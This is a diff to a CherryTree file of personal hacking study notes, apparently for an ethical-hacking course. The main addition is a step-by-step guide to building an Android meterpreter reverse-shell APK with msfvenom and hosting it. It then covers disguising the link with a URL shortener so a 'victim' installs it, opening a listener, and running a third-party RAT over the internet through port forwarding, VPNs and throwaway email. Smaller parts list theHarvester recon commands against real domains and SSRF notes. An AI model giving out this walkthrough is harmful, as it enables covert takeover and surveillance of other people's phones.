@@ -633,7 +633,109 @@ Simple firewall :: </rich_text>
     <rich_text>
 ===========================================================================</rich_text>
   </node>
-  <node name="Module 15: SQL Injection" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1621940388" ts_lastsave="1621940388"/>
+  <node name="Module 15: SQL Injection" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1621940388" ts_lastsave="1622870937"/>
+  <node name="Module 17: Hacking Mobile Platforms" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622870937" ts_lastsave="1622878865">
+    <rich_text>#There are multiple ways to hack into mobile devices:
+1. Meterpreter 
+
+# You need to install Emulator : </rich_text>
+    <rich_text link="webs https://www.bignox.com/">https://www.bignox.com/</rich_text>
+    <rich_text>
+#YOU can't hack into IOS device. Neither EC-council has any solution. 
+#LINK to RAT : </rich_text>
+    <rich_text link="webs https://github.com/SumedhDawadi/888RAT_1.1.1_RAT.git">https://github.com/SumedhDawadi/888RAT_1.1.1_RAT.git</rich_text>
+    <rich_text>
+================================================================
+</rich_text>
+    <rich_text background="#ffff00000000">A. Meterpreter: </rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text background="#ffff00000000">1. Generating payload :</rich_text>
+    <rich_text> 
+→  msfvenom -p android/meterpreter/reverse_tcp lhost= *IP address o the accter machine* lport=4444 -o /var/www/html/run.apk
+
+Here, 
+msfvenom : Helps to make payload
+-p            : payload with its type 
+lhost        : IP address of the attacker
+lport        : *port number of the device*
+-o            : output where you want to save. 
+
+</rich_text>
+    <rich_text background="#ffff00000000">2. Starting Apache payload</rich_text>
+    <rich_text> 
+→ service apache2 start
+
+</rich_text>
+    <rich_text background="#ffff00000000">3. With the social engineering send the url to the victime. </rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text background="#ffff00000000">example : 192.168.22.45/run.apk</rich_text>
+    <rich_text> : You can use bitly or URL shortner to short the url.
+
+</rich_text>
+    <rich_text background="#ffff00000000">4. Now create the listner to access the victime's phone.</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text background="#ffff00000000">5. Open Metasploit </rich_text>
+    <rich_text>
+→ msfconsole 
+→ use exploit multi/handler
+→ set paylaod android/meterpreter/reverse_tcp
+→ show options
+→ set LHOST *IP of the attacker*
+→ set LPORT *The same portNumber of that you set*
+→ exploit
+
+</rich_text>
+    <rich_text background="#ffff00000000">6. After listening the handler, install the payload.</rich_text>
+    <rich_text> 
+
+</rich_text>
+    <rich_text background="#ffff00000000">7. Click on the APK file that you have downloaded.</rich_text>
+    <rich_text>  
+
+</rich_text>
+    <rich_text background="#ffff00000000">8. meterpreter &gt;</rich_text>
+    <rich_text>  : if you see this you have hacked into the mobile phone. 
+
+================================================================
+#To peform this on WAN we need to have portforwarding enable on your router &amp; set static IP
+--------------------------------------------------------------------------------------------------------------------------------
+#To hack outside the network, these are the things that you need : 
+
+1.OpenVPN : This will give you static IP 
+2. temp-mail.org : To create account. 
+3. portmap.io : This will give you port-forwarding option. 
+→ click on create new configuration     
+→ select on TCP 
+→ Generate 
+→ Download
+→ Go to OpenVPN → community → downloads → download windows 64-bit MSI installer.
+→ Right click to OPENVPN → import → select the file that you have downloaded. (ovenvpn ext)
+→ Connect the OpenVPN from right click. → once it is connected green icon appears 
+→ Go to portmap.io → create new rules → Change portmap.host to portmap.io → port 1234 → create 
+→ we will get a IP address like tcp://*sfdfgrgerg12.portmap.io → ping it → if error → use VPN.
+→ VPN such as protonVPN can be used and again try pinging.
+→ Copy the IP address that you got from VPN → open your RAT.
+
+4. RAT : 
+→ Must have JDK installed. 
+→ Run %temp%. → open apkx → delete apktool (jdk) → and paste the JDK file you got from RAT 1.1.1.1
+→ RUN the RAT → set the IP address you got from VPN → set the PORT no from portmap.io → select APK    → create
+→  RAT will assign you with particular name in the Temp folder.  
+→ On the Lister in the RAT → change the port number that we have set → 1234 → click Listen
+→ Sent the link that you got from portmap.io (victime)
+→ USE any phone to hack or use the below website for testing.
+lets upload our paylaod → </rich_text>
+    <rich_text link="webs https://appetize.io/">https://appetize.io/</rich_text>
+    <rich_text> → upload → generate → use Temp-mail for account.
+→  open RAT and see what info can you find.
+</rich_text>
+  </node>
   <node name="Module 20: Cryptography" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1620966583" ts_lastsave="1620975225">
     <rich_text>1. </rich_text>
     <rich_text weight="heavy">Cryptography</rich_text>
@@ -753,7 +855,7 @@ Firewall :: </rich_text>
 ====================================================================
 #</rich_text>
   </node>
-  <node name="Bugs" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1621941520" ts_lastsave="1622350822">
+  <node name="Bugs" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1621941520" ts_lastsave="1622877345">
     <rich_text link="webs https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</rich_text>
     <rich_text>
 ==============================================================
@@ -828,7 +930,7 @@ Link for payloads : </rich_text>
       <rich_text>
 ==============================================================</rich_text>
     </node>
-    <node name="SERVER SIDE REQUEST FORGERY" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622281142" ts_lastsave="1622285276">
+    <node name="SERVER SIDE REQUEST FORGERY" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622281142" ts_lastsave="1622736737">
       <rich_text># Server-Side Request Forgery (SSRF) refers to an attack, wherein an attacker can send a crafted request from a vulnerable web application. SSRF is mainly used to target internal systems behind WAF (web application firewall), that are unreachable to an attacker from the external network.
 =====================================================================
 </rich_text>
@@ -836,7 +938,9 @@ Link for payloads : </rich_text>
       <rich_text>
   1.SSRF attacks often exploit trust relationships to escalate an attack from the vulnerable application and perform unauthorized actions. These trust relationships might exist in relation to the server itself, or in relation to other back-end systems within the same organization.
   
-1.1 Port scanning: A user can scan the port of a particular website through the vulnerable web application which is processing the user’s URL.
+</rich_text>
+      <rich_text background="#ffff00000000">1.1 Port scanning:</rich_text>
+      <rich_text> A user can scan the port of a particular website through the vulnerable web application which is processing the user’s URL.
 
 2. Fingerprinting intranet.
 
@@ -967,6 +1071,8 @@ Link for payloads : </rich_text>
 
 </rich_text>
     </node>
+    <node name="Remote Code Execution (RCE)" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622619919" ts_lastsave="1622619919"/>
+    <node name="Host header injection." unique_id="45" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622877345" ts_lastsave="1622877353"/>
   </node>
   <node name="[FILTER]:CROSS SITE SCRIPTING" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622293290" ts_lastsave="1622300028">
     <rich_text>#Filters can commonly used by web-developers in the webisite inorder to prevent from hacking. Filters can be bypassed. Waf are the common example of Filters.
@@ -1304,8 +1410,8 @@ sitedigger
 
 </rich_text>
   </node>
-  <node name="Tools" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622442447" ts_lastsave="1622614549">
-    <node name="Nuclie" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622442880" ts_lastsave="1622481129">
+  <node name="Tools" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622442447" ts_lastsave="1622744521">
+    <node name="Nuclie" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622442880" ts_lastsave="1622744686">
       <rich_text>#Nuclei is one of the tool Projected by project discovery. It is a powerful tools that will help you for automate Vulnerablity scanning, Reconnaissance, Penetration Testing with ease.
 ----------------------------------------------------------------------------------------------------------------------------------------
 </rich_text>
@@ -1355,7 +1461,7 @@ sitedigger
 ------------------------------------------------------------------------------------------------------------------------------------------
 4. Single Templates : 
 &gt; nuclei -t *name of the template* -l lists.txt -o result.txt
-------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------
 </rich_text>
     </node>
     <node name="GAU (GetAllUrls)" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622442920" ts_lastsave="1622481754">
@@ -1460,15 +1566,28 @@ sitedigger
 → discovery/info_disclosure/interesting_files #Interesting files.
 → </rich_text>
     </node>
-    <node name="theHarvester" unique_id="38" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622614549" ts_lastsave="1622615979">
+    <node name="theHarvester" unique_id="38" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622614549" ts_lastsave="1622616074">
       <rich_text background="#ffff00000000">#Commands:</rich_text>
       <rich_text>       
         theharvester -d microsoft.com -l 500 -b google -h myresults.html
         theharvester -d microsoft.com -b pgp
         theharvester -d microsoft -l 200 -b linkedin
         theharvester -d apple.com -b googleCSE -l 500 -s 300
+        theHarvester -d elsevier.com -b all
+        theharvester -d cvcc.edu -l 500 -b google -f myresults.html
 =====================================================================
-theHarvester -d elsevier.com -b all</rich_text>
+</rich_text>
     </node>
+    <node name="Random tool: REVIEW" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622743936" ts_lastsave="1622823842">
+      <rich_text>1. </rich_text>
+      <rich_text link="webs https://subdomainfinder.c99.nl/">https://subdomainfinder.c99.nl/</rich_text>
+      <rich_text> : Subdomain-finder online
+2. securityheaders.com                : Webiste header
+3. </rich_text>
+      <rich_text link="webs https://crt.sh/">https://crt.sh/</rich_text>
+      <rich_text>                         : Subdomain-finder online.
+</rich_text>
+    </node>
+    <node name="waffwoff" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1622744295" ts_lastsave="1622744295"/>
   </node>
 </cherrytree>
